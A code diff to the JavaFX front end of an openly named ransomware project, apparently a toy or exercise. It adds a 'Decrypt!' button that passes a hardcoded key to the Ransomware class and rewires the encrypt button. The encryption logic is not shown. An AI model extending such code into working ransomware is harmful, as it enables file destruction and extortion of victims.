@@ -14,6 +14,7 @@ import javafx.stage.WindowEvent;
  */
 public class GUI extends Application {
 	private Button encrypt;
+	private Button decrypt;
 
 	/**
 	 * Sets up the interface
@@ -29,7 +30,22 @@ public class GUI extends Application {
 				new Thread() {
 					@Override
 					public void run() {
-						(new Ransomware()).begin();
+						(new Ransomware()).beginEncryption();
+					}
+				}.start();
+			}
+		});
+
+		decrypt = new Button("Decrypt!");
+		decrypt.setOnAction(new EventHandler<ActionEvent>() {
+
+			@Override
+			public void handle(ActionEvent event) {
+				new Thread() {
+					@Override
+					public void run() {
+						(new Ransomware()).beginDecryption("-----BEGIN PRIVATE KEY-----\n" + "VghJcp2rfZNUSHAiRAuoyg=="
+								+ "-----END PRIVATE KEY-----");
 					}
 				}.start();
 			}
@@ -41,7 +57,8 @@ public class GUI extends Application {
 		paneCenter.setSpacing(10);
 		pane.setCenter(paneCenter);
 		paneCenter.getChildren().add(encrypt);
-		Scene scene = new Scene(pane, 400, 200);
+		paneCenter.getChildren().add(decrypt);
+		Scene scene = new Scene(pane, 200, 200);
 		primaryStage.setScene(scene);
 		primaryStage.setTitle("Encrypt");
 
